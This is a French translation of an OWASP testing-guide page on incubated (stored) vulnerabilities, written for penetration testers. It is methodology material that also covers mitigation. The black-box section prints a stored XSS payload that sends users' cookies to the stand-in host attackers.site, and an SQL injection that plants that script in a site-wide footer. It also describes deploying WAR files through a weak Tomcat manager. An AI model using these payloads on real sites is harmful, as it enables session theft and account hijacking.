# Tester la vulnérabilité incubée

|ID          |
|------------|
|WSTG-INPV-14|

## Sommaire

Aussi souvent appelés attaques persistantes, les tests incubés sont une méthode de test complexe qui nécessite plus d'une vulnérabilité de validation des données pour fonctionner. Les vulnérabilités incubées sont généralement utilisées pour mener des attaques "point d'eau" contre les utilisateurs d'applications Web légitimes.

Les vulnérabilités incubées ont les caractéristiques suivantes :

- Le vecteur d'attaque doit être persistant en premier lieu, il doit être stocké dans la couche de persistance, et cela ne se produirait que si une validation de données faible était présente ou si les données arrivaient dans le système via un autre canal tel qu'une console d'administration ou directement via un traitement par lots backend.
- Deuxièmement, une fois que le vecteur d'attaque a été "rappelé", le vecteur doit être exécuté avec succès. Par exemple, une attaque XSS incubée nécessiterait une validation de sortie faible afin que le script soit livré au client sous sa forme exécutable.

L'exploitation de certaines vulnérabilités, ou même de fonctionnalités fonctionnelles d'une application Web, permettra à un attaquant d'implanter une donnée qui sera ensuite récupérée par un utilisateur ou un autre composant du système sans méfiance, exploitant une vulnérabilité à cet endroit.

Dans un test de pénétration, les "attaques incubées" peuvent être utilisées pour évaluer la criticité de certains bogues, en utilisant le problème de sécurité particulier trouvé pour créer une attaque côté client qui sera généralement utilisée pour cibler un grand nombre de victimes en même temps. (c'est-à-dire tous les utilisateurs naviguant sur le site).

Ce type d'attaque asynchrone couvre un large spectre de vecteurs d'attaque, parmi lesquels :

- Composants de téléchargement de fichiers dans une application Web, permettant à l'attaquant de télécharger des fichiers multimédias corrompus (images JPEG exploitant `CVE-2004-0200`, images PNG exploitant `CVE-2004-0597`, fichiers exécutables, pages de site avec composant actif, etc. .)
- Problèmes de script intersite dans les messages des forums publics (voir [Test pour le script intersite stocké](02-Testing_for_Stored_Cross_Site_Scripting.md) pour plus de détails). Un attaquant pourrait potentiellement stocker des scripts ou du code malveillants dans un référentiel dans le backend de l'application Web (par exemple, une base de données) afin que ce script/code soit exécuté par l'un des utilisateurs (utilisateurs finaux, administrateurs, etc.). L'archétype de l'attaque incubée est illustré par l'utilisation d'une vulnérabilité de script intersite dans un forum d'utilisateurs, un babillard ou un blog afin d'injecter du code JavaScript sur la page vulnérable, et sera finalement rendu et exécuté sur le navigateur de l'utilisateur du site -- en utilisant le niveau de confiance du site d'origine (vulnérable) sur le navigateur de l'utilisateur.
- Injection SQL/XPATH permettant à l'attaquant de télécharger du contenu dans une base de données, qui sera ensuite récupéré dans le cadre du contenu actif d'une page Web. Par exemple, si l'attaquant peut publier du code JavaScript arbitraire dans un tableau d'affichage afin qu'il soit exécuté par les utilisateurs, il peut alors prendre le contrôle de leurs navigateurs (par exemple, [XSS-proxy](http://sourceforge.net/projects/xss-Procuration)).
- Serveurs mal configurés permettant l'installation de packages Java ou de composants de site Web similaires (c'est-à-dire Tomcat ou des consoles d'hébergement Web telles que Plesk, CPanel, Helm, etc.)

## Objectifs des tests

- Identifier les injections qui sont stockées et nécessitent une étape de rappel à l'injection stockée.
- Comprendre comment une étape de rappel peut se produire.
- Réglez les écouteurs ou activez l'étape de rappel si possible.

## Comment tester

### Test de la boîte noire

#### Exemple de téléchargement de fichier

Vérifiez le type de contenu autorisé à télécharger sur l'application Web et l'URL résultante pour le fichier téléchargé. Téléchargez un fichier qui exploitera un composant dans le poste de travail de l'utilisateur local lorsqu'il sera visualisé ou téléchargé par l'utilisateur. Envoyez à votre victime un e-mail ou une autre sorte d'alerte afin de l'amener à parcourir la page. Le résultat attendu est que l'exploit sera déclenché lorsque l'utilisateur navigue sur la page résultante ou télécharge et exécute le fichier à partir du site de confiance.

#### Exemple XSS sur un tableau d'affichage

1. Entrez le code JavaScript comme valeur pour le champ vulnérable, par exemple `<script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">' )</script>`
2. Demandez aux utilisateurs de parcourir la page vulnérable ou attendez que les utilisateurs la parcourent. Avoir un "auditeur" sur l'hôte `attackers.site` à l'écoute de toutes les connexions entrantes.
3. Lorsque les utilisateurs naviguent sur la page vulnérable, une requête contenant leur cookie (`document.cookie` est inclus dans l'URL demandée) sera envoyée à l'hôte `attackers.site`, par exemple : `GET /cv.jpg ?SignOn=COOKIEVALUE1 ; %20ASPSESSIONID=ROGUEIDVALUE ; HTTP/1.1`
4. Utilisez les cookies obtenus pour usurper l'identité des utilisateurs du site vulnérable.

#### Exemple d'injection SQL

Habituellement, cet ensemble d'exemples exploite les attaques XSS en exploitant une vulnérabilité d'injection SQL. La première chose à tester est de savoir si le site cible présente une vulnérabilité d'injection SQL. Ceci est décrit dans [Testing for SQL Injection](05-Testing_for_SQL_Injection.md). Pour chaque vulnérabilité d'injection SQL, il existe un ensemble sous-jacent de contraintes décrivant le type de requêtes que l'attaquant/pentesteur est autorisé à effectuer.

Le testeur doit ensuite faire correspondre les attaques XSS qu'il a conçues avec les entrées qu'il est autorisé à insérer.

De la même manière que dans l'exemple XSS précédent, utilisez un champ de page Web vulnérable aux problèmes d'injection SQL pour modifier une valeur dans la base de données qui serait utilisée par l'application comme entrée à afficher sur le site sans filtrage approprié (ce serait une combinaison d'une injection SQL et d'un problème XSS). Par exemple, supposons qu'il y ait une table `footer` dans la base de données avec tous les pieds de page des pages du site Web, y compris un champ `notice` avec la mention légale qui apparaît au bas de chaque page Web. Vous pouvez utiliser la requête suivante pour injecter du code JavaScript dans le champ "notice" de la table "footer" de la base de données.

```sql
SELECT field1, field2, field3
FROM table_x
WHERE field2 = 'x';
   UPDATE footer
   SET notice = 'Copyright 1999-2030%20
       <script>document.write(\'<img src="http://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'
   WHERE notice = 'Copyright 1999-2030';
```

Désormais, chaque utilisateur naviguant sur le site enverra silencieusement ses cookies au `attaquants.site`.

#### Serveur mal configuré

Certains serveurs web présentent une interface d'administration qui peut permettre à un attaquant d'uploader sur le site des composants actifs de son choix. Cela pourrait être le cas avec un serveur Apache Tomcat qui n'impose pas d'informations d'identification fortes pour accéder à son gestionnaire d'applications Web (ou si les testeurs de stylo ont pu obtenir des informations d'identification valides pour le module d'administration par d'autres moyens).

Dans ce cas, un fichier WAR peut être téléchargé et une nouvelle application Web déployée sur le site, ce qui permettra non seulement au testeur d'intrusion d'exécuter le code de son choix localement sur le serveur, mais également de planter une application sur le site de confiance, auxquels les utilisateurs réguliers du site peuvent alors accéder (très probablement avec un degré de confiance plus élevé que lorsqu'ils accèdent à un autre site).

Comme cela devrait également être évident, la possibilité de modifier le contenu de la page Web sur le serveur, via toutes les vulnérabilités pouvant être exploitées sur l'hôte qui donneront à l'attaquant des autorisations d'écriture webroot, sera également utile pour lancer une telle attaque incubée sur le serveur Web. pages (en fait, il s'agit d'une méthode de propagation d'infection connue pour certains vers de serveur Web).

### Test de la boîte grise

Les techniques de test en boîte grise ou en boîte blanche seront les mêmes que celles décrites précédemment.

- L'examen de la validation des entrées est essentiel pour atténuer cette vulnérabilité. Si d'autres systèmes de l'entreprise utilisent la même couche de persistance, leur validation des entrées peut être faible et les données peuvent être conservées via une "porte dérobée".
- Pour lutter contre le problème de "porte dérobée" pour les attaques côté client, la validation de sortie doit également être utilisée afin que les données entachées soient encodées avant d'être affichées sur le client, et donc pas exécutées.

## Outils

- [XSS-proxy](https://sourceforge.net/projects/xss-proxy)
- [Proxy d'attaque Zed OWASP (ZAP)](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [Metasploit](https://www.metasploit.com/)

## Références

La plupart des références de la section Cross-site scripting sont valides. Comme expliqué ci-dessus, les attaques incubées sont exécutées lors de la combinaison d'exploits tels que XSS ou des attaques par injection SQL.

### Avis

- [Avis CERT CA-2000-02 Balises HTML malveillantes intégrées dans les requêtes Web des clients](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Blackboard Academic Suite 6.2.23 +/- : vulnérabilité de script intersite persistante](https://cxsecurity.com/issue/WLB-2006080004)

### Papiers blanc

- [Consortium de sécurité des applications Web "Classification des menaces, script intersite"](http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml)
